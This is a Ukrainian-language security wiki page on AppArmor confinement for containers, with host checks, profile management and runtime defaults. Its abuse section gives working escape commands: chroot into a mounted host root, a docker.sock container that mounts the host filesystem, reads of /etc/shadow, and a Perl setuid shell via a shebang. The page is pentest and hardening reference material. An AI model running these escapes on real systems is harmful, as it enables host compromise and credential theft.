# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

AppArmor — це система **обов'язкового контролю доступу**, яка застосовує обмеження через профілі для кожної програми. На відміну від традиційних перевірок DAC, що значною мірою залежать від власника та груп, AppArmor дозволяє ядру застосовувати політику, прив'язану до самого процесу. У контейнерних середовищах це важливо, бо робоче навантаження може мати достатні традиційні привілеї для спроби дії, але все одно отримати відмову, якщо його профіль AppArmor не дозволяє відповідний шлях, монтування, мережеву поведінку або використання capability.

Найважливіший концептуальний момент — AppArmor є **path-based**. Він оцінює доступ до файлової системи через правила шляхів, а не через мітки, як це робить SELinux. Це робить його зрозумілим і потужним, але також означає, що bind mounts і альтернативні розташування шляхів потребують уважної уваги. Якщо той самий вміст хоста стане доступним за іншим шляхом, дія політики може відрізнятися від того, чого оператор очікував спочатку.

## Роль у ізоляції контейнерів

Огляди безпеки контейнерів часто обмежуються перевірками capabilities і seccomp, але AppArmor залишається важливим навіть після них. Уявіть контейнер, який має більше привілеїв, ніж повинен, або робоче навантаження, якому з операційних причин потрібна ще одна capability. AppArmor все ще може обмежувати доступ до файлів, поведінку при монтуванні, мережеві операції та шаблони виконання так, щоб зупинити очевидний шлях зловживання. Саме тому відключення AppArmor "just to get the application working" може непомітно перетворити ризикову конфігурацію на ту, яку легко експлуатувати.

## Лаб

Щоб перевірити, чи AppArmor активний на хості, використайте:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Щоб побачити, під яким обліковим записом виконується поточний процес контейнера:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Різниця повчальна. У звичайному випадку процес має показувати AppArmor-контекст, прив'язаний до профілю, обраного runtime. У випадку unconfined цей додатковий шар обмежень зникає.

Ви також можете перевірити, що Docker вважає, що застосував:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Використання під час виконання

Docker може застосувати стандартний або користувацький профіль AppArmor, якщо хост це підтримує. Podman також може інтегруватися з AppArmor на системах, заснованих на AppArmor, хоча в дистрибутивах із пріоритетом SELinux інша MAC-система часто домінує. Kubernetes може експонувати політику AppArmor на рівні робочого навантаження на вузлах, які фактично підтримують AppArmor. LXC та суміжні середовища системних контейнерів родини Ubuntu також широко використовують AppArmor.

Практичний висновок: AppArmor — це не "Docker feature". Це функція ядра хоста, яку можуть застосовувати різні середовища виконання. Якщо хост не підтримує її або середовищу виконання вказано запускатися unconfined, очікуваного захисту фактично немає.

На хостах з підтримкою AppArmor для Docker найвідомішим дефолтним профілем є `docker-default`. Цей профіль генерується з Moby's AppArmor template і важливий, бо пояснює, чому деякі capability-based PoCs все ще не працюють у контейнері за замовчуванням. Загалом, `docker-default` дозволяє звичайну мережеву взаємодію, забороняє записи до більшості `/proc`, забороняє доступ до чутливих частин `/sys`, блокує операції mount і обмежує ptrace так, щоб він не був загальним примітивом для обстеження хоста. Розуміння цієї базової політики допомагає відрізнити "the container has `CAP_SYS_ADMIN`" від "the container can actually use that capability against the kernel interfaces I care about".

## Керування профілями

AppArmor profiles зазвичай зберігаються під `/etc/apparmor.d/`. Поширена конвенція іменування полягає в заміні косих рис у шляху виконуваного файлу на крапки. Наприклад, профіль для `/usr/bin/man` зазвичай зберігається як `/etc/apparmor.d/usr.bin.man`. Ця деталь має значення як для захисту, так і для оцінки, оскільки, знаючи ім'я активного профілю, ви часто можете швидко знайти відповідний файл на хості.

Корисні команди для керування на боці хоста включають:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Причина, чому ці команди важливі в довіднику з container-security, полягає в тому, що вони пояснюють, як профілі фактично будуються, завантажуються, переключаються в complain mode і змінюються після змін у додатку. Якщо оператор має звичку переводити профілі в complain mode під час усунення неполадок і забувати відновити enforcement, контейнер може виглядати захищеним у документації, тоді як насправді поводитись значно вільніше.

### Створення та оновлення профілів

`aa-genprof` може спостерігати за поведінкою додатку та допомогти інтерактивно згенерувати профіль:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` може згенерувати шаблон профілю, який пізніше можна завантажити за допомогою `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Коли бінарний файл змінюється і політику потрібно оновити, `aa-logprof` може відтворити відмови, знайдені в логах, і допомогти оператору вирішити, чи дозволити їх або відхилити:
```bash
sudo aa-logprof
```
### Логи

Відмови AppArmor зазвичай видно через `auditd`, syslog або інструменти, такі як `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Це корисно в оперативній та наступальній роботі. Захисники використовують це для уточнення профілів. Атакувальники використовують це, щоб з'ясувати, який саме шлях або операція відхиляється і чи AppArmor є механізмом, що блокує ланцюжок експлуатації.

### Ідентифікація точного файлу профілю

Коли runtime показує конкретну назву профілю AppArmor для container, часто корисно зіставити цю назву з файлом профілю на диску:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Це особливо корисно під час перевірки на боці хоста, оскільки це долає розрив між «контейнер каже, що він працює під профілем `lowpriv`» і «реальні правила зберігаються в цьому конкретному файлі, який можна перевірити або перезавантажити».

## Неправильні налаштування

Найочевиднішою помилкою є `apparmor=unconfined`. Адміністратори часто ставлять цей параметр під час відлагодження програми, яка впала, тому що профіль правильно заблокував щось небезпечне або несподіване. Якщо прапорець лишається в продакшені, весь шар MAC фактично відключено.

Інша тонка проблема — припущення, що bind mounts нешкідливі, бо дозволи файлів виглядають нормальними. Оскільки AppArmor працює на основі шляхів, відкриття шляхів хоста під альтернативними точками монтування може погано взаємодіяти з правилами за шляхами. Третя помилка — забути, що назва профілю в конфігураційному файлі мало що означає, якщо ядро хоста фактично не примушує AppArmor.

## Зловживання

Коли AppArmor відсутній, операції, які раніше були обмежені, раптово можуть запрацювати: читання чутливих шляхів через bind mounts, доступ до частин procfs або sysfs, які мали б залишатися складнішими у використанні, виконання дій, пов'язаних з монтуванням, якщо capabilities/seccomp також це дозволяють, або використання шляхів, які профіль зазвичай би заборонив. AppArmor часто є тим механізмом, який пояснює, чому спроба виходу на основі capabilities «теоретично має працювати», але все ще не вдається на практиці. Видаліть AppArmor — і та сама спроба може почати вдаватися.

Якщо ви підозрюєте, що AppArmor — головна перешкода для path-traversal, bind-mount або mount-based ланцюжка зловживань, перший крок зазвичай — порівняти, що стає доступним з профілем і без нього. Наприклад, якщо шлях хоста змонтований всередині контейнера, почніть з перевірки, чи можете ви пройтися по ньому та прочитати його:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Якщо контейнер також має небезпечну capability, таку як `CAP_SYS_ADMIN`, один із найпрактичніших тестів — перевірити, чи саме AppArmor блокує операції монтування або доступ до чутливих файлових систем ядра:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
У середовищах, де host path вже доступний через bind mount, втрата AppArmor також може перетворити проблему розкриття інформації лише для читання на прямий доступ до файлів хоста:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Суть цих команд не в тому, що AppArmor сам по собі створює breakout. Йдеться про те, що після видалення AppArmor багато filesystem- та mount-based abuse paths одразу стають доступними для тестування.

### Повний приклад: AppArmor вимкнено + корінь хоста змонтовано

Якщо контейнер вже має корінь хоста bind-mounted у `/host`, видалення AppArmor може перетворити заблокований filesystem abuse path на повний host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Як тільки shell виконується через файлову систему хоста, робоче навантаження фактично вийшло за межі контейнера:
```bash
id
hostname
cat /etc/shadow | head
```
### Повний приклад: AppArmor вимкнено + Runtime Socket

Якщо справжнім бар’єром був AppArmor, що оточував runtime state, змонтований socket може бути достатнім для повного escape:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Точний шлях залежить від точки монтування, але кінцевий результат той самий: AppArmor більше не перешкоджає доступу до runtime API, і runtime API може запустити контейнер, що компрометує хост.

### Повний приклад: Path-Based Bind-Mount Bypass

Оскільки AppArmor базується на шляхах, захист `/proc/**` автоматично не захищає той самий вміст procfs хоста, коли він доступний через інший шлях:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Вплив залежить від того, що саме змонтовано і чи цей альтернативний шлях також оминає інші засоби контролю, але цей шаблон є одним із найочевидніших аргументів на користь того, що AppArmor слід оцінювати разом із розташуванням точок монтування, а не окремо.

### Повний приклад: Shebang Bypass

AppArmor policy інколи орієнтується на шлях інтерпретатора так, що не повністю враховує виконання скриптів через обробку shebang. Історичний приклад включав використання скрипта, перший рядок якого вказує на ізольований інтерпретатор:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Такий приклад важливий як нагадування про те, що наміри профілю та фактична семантика виконання можуть розходитися. Під час перегляду AppArmor у контейнерних середовищах слід особливо звертати увагу на ланцюги інтерпретаторів і альтернативні шляхи виконання.

## Checks

Метою цих перевірок є швидко дати відповіді на три запитання: чи увімкнено AppArmor на хості, чи поточний процес обмежено профілем, і чи runtime дійсно застосував профіль до цього контейнера?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Що тут цікаво:

- Якщо `/proc/self/attr/current` показує `unconfined`, то навантаження не отримує користі від ізоляції AppArmor.
- Якщо `aa-status` показує, що AppArmor відключено або не завантажено, будь-яке ім'я профілю в runtime-конфігурації здебільшого косметичне.
- Якщо `docker inspect` показує `unconfined` або несподіваний кастомний профіль, це часто є причиною, через яку працює шлях зловживання файловою системою або через монтування.

Якщо контейнер уже має підвищені привілеї з операційних причин, залишення AppArmor увімкненим часто означає різницю між контрольованим винятком і набагато ширшим провалом у безпеці.

## Налаштування runtime за замовчуванням

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Увімкнено за замовчуванням на хостах, що підтримують AppArmor | Використовує профіль AppArmor `docker-default`, якщо його не перевизначено | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Залежить від хоста | AppArmor підтримується через `--security-opt`, але точний стан за замовчуванням залежить від хоста/runtime і менш універсальний, ніж задокументований Docker профіль `docker-default` | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Умовний стан за замовчуванням | Якщо `appArmorProfile.type` не вказано, за замовчуванням використовується `RuntimeDefault`, але він застосовується лише коли AppArmor увімкнений на вузлі | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` з слабким профілем, вузли без підтримки AppArmor |
| containerd / CRI-O under Kubernetes | Залежить від підтримки вузла/runtime | Поширені runtime'и, підтримувані Kubernetes, підтримують AppArmor, але фактичне застосування залежить від підтримки вузла та налаштувань робочого навантаження | Те саме, що й у рядку Kubernetes; пряма конфігурація runtime також може зовсім відключити AppArmor |

Для AppArmor найважливішою змінною часто є хост, а не тільки runtime. Налаштування профілю в манифесті не створює ізоляцію на вузлі, де AppArmor не ввімкнено.
